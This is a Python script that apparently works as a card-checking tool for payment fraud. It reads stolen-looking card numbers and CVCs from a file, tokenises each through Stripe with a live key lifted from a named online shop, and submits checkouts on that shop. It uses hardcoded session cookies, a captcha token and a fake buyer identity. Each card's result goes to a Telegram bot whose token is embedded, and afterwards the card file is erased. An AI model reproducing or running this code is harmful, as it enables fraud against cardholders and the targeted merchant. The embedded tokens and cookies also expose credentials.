import requests
import os,re,time,random
from user_agent import generate_user_agent
import json

file_path = '/storage/emulated/0/Documents/pydroid3/xforce/cards.json'
bot_token = "5556552193:AAGGN0Mfi22qYaennhcLc-lMmqLrwOmi5LY"
chat_id = "1008961594"

def read_cards(file_path):
    with open(file_path, 'r') as file:
    	cards = [json.loads(line) for line in file]
    return cards
    
def process_cards(cards):
    
        for card in cards:
        	formatted_card = f"{card['num']}|{card['month']}|{card['year']}|{card['code']}"
        	nn, mm, yy, cvc = formatted_card.strip().split('|')
        	
        	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,hi-IN;q=0.6,hi;q=0.5',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
        	data = f'type=card&billing_details[name]=Ali+Mazen&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][postal_code]=10010&billing_details[address][state]=NY&billing_details[email]=klbjzzel%40hi2.in&billing_details[phone]=0994488358&card[number]={nn}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=ba8f5f95-bf9d-47e2-8b0f-656ca8590a7d79f216&sid=NA&payment_user_agent=stripe.js%2F50ba0a1035%3B+stripe-js-v3%2F50ba0a1035%3B+split-card-element&referrer=https%3A%2F%2Fal-nadha.com&time_on_page=263992&key=pk_live_51HzoJkDhTL3jxamujcfGoKiSXVXVRxWTOBMWPHoaiwvPtvYdUjAoAn5dxRtYID8nJ2eJNdyTB2OJ8SQB6SlTJsqG005wLErA2T&_stripe_account=acct_1HzoJkDhTL3jxamu&_stripe_version=2022-08-01&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQaL3jPgLg7NblKeDOk-SuL39N9H3Gi4VTgkv0PMXcKIezTuD5_5K7riB18xnJcAm5LpcxbrbQfZCUeMgTETPNiZDJBFDtcYb8occuG_mhyWNhCRVepCMPKTXVW0FbBSU71uGMmo6NarssmYEGcIiLJXa7xMN23Df8L26q4MPRN82nmmYuCGyuliM1BUv27S2XOkOGQRZpMF9whs-mISiOOsWc_wrcyWuChaQX7qfpRPJWl6K2b8pyybfzqq_drexg3ljaqarYhIrHnGubpad7mfoFgQ6W0xj5x5nCd0Zk5nTCmrgMrUKopYkyVjC0VPzKZdgdWTkza-Iqxq012NTDzuHUMQzUSFMIQ2eeCdzrJ4plqhOPYvNHoXaJZDmNLVndjWhOGLvDu8hN618DmuhATZD5GLzFuOJTXUN5ubRR53OXFQZBC_6aeqJk-nuYTzXXTUoW0PW-j2wMtb_GOlh7qgWPd8bgS_DvrF2A61Pt8M-Yp_uWmsYfAsqsuZHaaiy9gnHUwugHQTmzzh4XtG9ap8TlpPREy46LHHqx-Z56InzvYjrT5F6b_zDMlCLbARmVhXHYFCzVVblMLBZ50_HZDoEmoaxzUqPJA-Nf5TCxxgJq0Y6mjw1gX03bCSLe6Z3EDTWQnyQsVaioBsJvGWlo64_viU6_0AKTTsEIGLH9O8ze6zFJL9OwUDmEOUBpgG6ULty8YxeDAFWGQUBAsRMxo-ZdJKLDWUP33tM43JswAhfsh8sD1XVvCfxfv3fCGu20qNNvnSft51XxwpdQuxgU5zMHKOks-C9AOgcy39BPdep33XUJu9EFo6oOp2cM6KLLhw_rrwn6pLBnvy6yMJQAnXTpcDcjO6Du3vxPdBy04SdSx1BX0-AdDagtRH8-sOEkygnC7TIp2ytgrvgK1f5FVDwF0CGUI8qGN7cv78VJZ-mn91vjZzc5o3ZF6GUj-F677ieEfebLSFXBZTrLMAnpk8UBSx_GNuAhYp6nY5eXdJLSsrGMzcZzCxLjxk2pYKrOU27L9QNu5tknuTd3hGbBl2jFwRmcE4u1g2OGBfhGG-sqmduveRsddFP3r6HLqSBBndNfVdUqdFi66G8F8EffWzL1nXxN6xc1M93n5_NVmOMw4yukusUFqk14W-xQibIVByKfAKxtW82Aq4IzfG4ApR5xQnw2t-hI8kVcKdnBtFu6m2ev4e9WteyIUqlNS924-vxQYpBhMvd9o5KJTROCdmojiwWmzdc-fAdXz7NFlsXEC1stn1by9fzogWt65QtoW-4geFZK9OSHH7WSuHA47DNxBhVYjHunAxw5D--4dT-eNOYVpR_iZsp99eBYHVhHs21ih0uZEaFfCKC7g00sbXheckwsx52UXSWeUInBx7e9srCvZ_IzCacm1yWBsP5u9-7j6PcSbJJ4NwMK-z9nEkVaWHoAWKvT5eNDefQ5FWPmSOPvcsNu9-tDgh8UXebjipGzIpe2d0OZXmOwAaOnFVFVPT1_RfFHTTraqNilKiwnGcMSYB8dxFMa7d4XkDaJJftOKjNGDwTD_zL_LI_Vr3iPCc8SGlcdZXP3GhOgjHSrqmgqdzSZ8Rz5S1XIj7eIZJQ8TgnBLlP-rHTY-KEgsUl0QMwdYufuVyGLykOqFqXCFseltjrehkwHP3PHbbyuYza5o-OPiTeB6qUU5vvpon5E4lHObtR0aRen5Sd1UeK_8SbMI-GR2hTCfhb1v6xa2b8ICaB_2y1KcpmVWxTHKU_kOFVs8MEVK2II1eFoFM-lsaFN9UNYrE5OXkbKowi09GDjA3Ekx3S2kQdsOfAnrVu8XkHuK3Ug_z8Cdiei7YNFrQTQaPnxN7qpzcOdSTRYFsRpMrrKOE2BTTo4Mkvq7sjWdFn4JLi14iNg86wsnqr5z3ANoR3CdqjNMcjjfXwNTUzhgkT8Yc31XMb7xqidbakj09LWQeCreV4ojrIYz-K5-LetA4BvHJoSXuffwfze-cXggUJ5DUQVgIIUx_ae2RVYnPkYks4nMdO5fwyzfAES6OQpNbxD7SWPe86H1nAEpm8wUvtJ94CanfCWC91WeZDQRo8OMFZ9XqhGuTsZJJkzGYzvK9K96Y1hS4gL0jEyKOAhOi2HazKHTtwEmDtjK3XTzVVxYdnGDepFUtId_qD6DPhP6mpQejAMHzFOp5Xlt2az_gc_VCQmqgJfecaXEiY4mHoA49yvsM2wzIkGdJr7LvLyqfFqwpWeaduaNleHDOZljthKhzaGFyZF9pZM4DMYNvomtyqDFmYjkxNTUxonBkAA.uuyI2b2EsKFmK_uEHi8ckl1dwUxxrZwVfHdqToygwBM'
        	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        	#print(response.json())
        	pm = response.json()["id"]
        	
        	
        	cookies = {
        	    '_fbp': 'fb.1.1713723118581.1914035830',
    '__stripe_mid': 'ba8f5f95-bf9d-47e2-8b0f-656ca8590a7d79f216',
    'wcaiocc_user_currency_cookie': 'USD',
    'breeze_folder_name': 'c549aa378c1ef78786640a0a9895f0b292ccc421',
    'wordpress_logged_in_8181e73ab86fda8b24141304097755c5': 'ali.mazen%7C1718313502%7C8iM62aRToDScjL6WhikvCLOLu0IQVY6eDqvW7sCj9f7%7C6991e67c8d6a505c1d969dde18ec6d54167c4269082c0adaacce1f0b3aadde1e',
    'mailpoet_subscriber': '%7B%22subscriber_id%22%3A42153%7D',
    'wp_woocommerce_session_8181e73ab86fda8b24141304097755c5': '20999%7C%7C1717457126%7C%7C1717453526%7C%7Cdd46e072b0095e857bd352469a6d4976',
    '_gid': 'GA1.2.758797750.1717340297',
    'mcfw-wp-user-cookie': 'MjA5OTl8MHw2M3wzOTc1NF8zNmYwOTlkM2EwYmIwYjkyYWM5NDkyMjE4OGE1NjlkZjlhMTc0YThiMTMyNzdjNDQ4MTVkZjUwNTY2ODRkNTg2',
    'wcaiocc_user_currency_session': 'USD',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-06-03%2002%3A24%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fal-nadha.com%2Fshop%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fal-nadha.com%2Fcart%2F',
    'sbjs_first_add': 'fd%3D2024-06-03%2002%3A24%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fal-nadha.com%2Fshop%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fal-nadha.com%2Fcart%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_udata': 'vst%3D4%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'woocommerce_recently_viewed': '419%7C537',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': '548c6e177e54b8a870fb6eb16d85f8c5',
    'mailpoet_page_view': '%7B%22timestamp%22%3A1717405330%7D',
    'sbjs_session': 'pgs%3D22%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fal-nadha.com%2Fcheckout%2F',
    '_ga': 'GA1.2.1133081560.1714188087',
    '_gat_gtag_UA_231601544_1': '1',
    '_ga_701NGE5REB': 'GS1.1.1717404834.15.1.1717405343.0.0.0',


}
    

        	headers = {
    'authority': 'al-nadha.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,hi-IN;q=0.6,hi;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://al-nadha.com',
    'referer': 'https://al-nadha.com/checkout/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }
    
    
        	params = {
    'wc-ajax': 'checkout',
    }
    
        	data = {
    'billing_first_name': 'Ali',
    'billing_last_name': 'Mazen',
    'billing_country': 'US',
    'billing_address_1': 'New York',
    'billing_postcode': '10010',
    'billing_city': 'New York',
    'billing_state': 'NY',
    'billing_phone': '0994488358',
    'billing_email': 'klbjzzel@hi2.in',
    'createaccount': '1',
    'order_comments': '',
    'wc_order_attribution_source_type': 'typein',
    'wc_order_attribution_referrer': '(none)',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': '(direct)',
    'wc_order_attribution_utm_medium': '(none)',
    'wc_order_attribution_utm_content': '(none)',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
    'wc_order_attribution_session_entry': 'https://al-nadha.com/#',
    'wc_order_attribution_session_start_time': '2024-05-30+20:43:50',
    'wc_order_attribution_session_pages': '14',
    'wc_order_attribution_session_count': '1',
    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'wc-points-rewards-max-points': '0',
    'payment_method': 'stripe_cc',
    'stripe_cc_token_key': pm,
    'stripe_cc_payment_intent_key': '',
    'stripe_cc_save_source_key': 'yes',
    'stripe_ideal_token_key': '',
    'stripe_ideal_payment_intent_key': '',
    'stripe_bancontact_token_key': '',
    'stripe_bancontact_payment_intent_key': '',
    'stripe_giropay_token_key': '',
    'stripe_giropay_payment_intent_key': '',
    'stripe_sofort_token_key': '',
    'stripe_sofort_payment_intent_key': '',
    'mailpoet_woocommerce_checkout_optin_present': '1',
    'terms': 'on',
    'terms-field': '1',
    'woocommerce-process-checkout-nonce': 'bfd84922ca',
    '_wp_http_referer': '/?wc-ajax=update_order_review'
    
    }
    
    

        	response = requests.post('https://al-nadha.com/', params=params, cookies=cookies, headers=headers, data=data)
        	html_message = response.json()["messages"]
        	cleanr = re.compile('<.*?>')
        	cleanmessage = re.sub(cleanr, '', html_message)
        	result = cleanmessage.strip()
    
    ### Send To Telegram bot 
        	requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",params={"chat_id": chat_id,"text": f"{formatted_card.strip()} ----> {response.json()}"})
    ###
 
        
                      
        
        
if __name__ == "__main__":    
    cards = read_cards(file_path)
    process_cards(cards)
    with open(file_path, 'w') as file:
    	file.write('')
